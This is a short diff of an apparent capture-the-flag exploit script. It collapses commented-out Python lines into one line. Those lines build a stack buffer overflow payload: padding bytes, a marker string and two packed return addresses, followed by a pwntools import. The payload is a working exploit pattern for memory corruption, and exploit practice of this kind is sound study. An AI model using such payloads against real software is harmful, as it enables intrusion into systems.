@@ -1,14 +1,4 @@
-# import sys, struct
-
-# payload  = b"A"*128
-# payload += b"itsY"
-# payload += b"B"*12
-# payload += b"C"*8
-# payload += struct.pack("<Q", 0x400aa4)
-# payload += struct.pack("<Q", 0x4008fd)
-
-# print(len(payload))
-# sys.stdout.buffer.write(payload)
+# import sys, struct; payload  = b"A"*128; payload += b"itsY"; payload += b"B"*12; payload += b"C"*8; payload += struct.pack("<Q", 0x400aa4); payload += struct.pack("<Q", 0x4008fd); sys.stdout.buffer.write(payload)
 
 from pwn import *
 
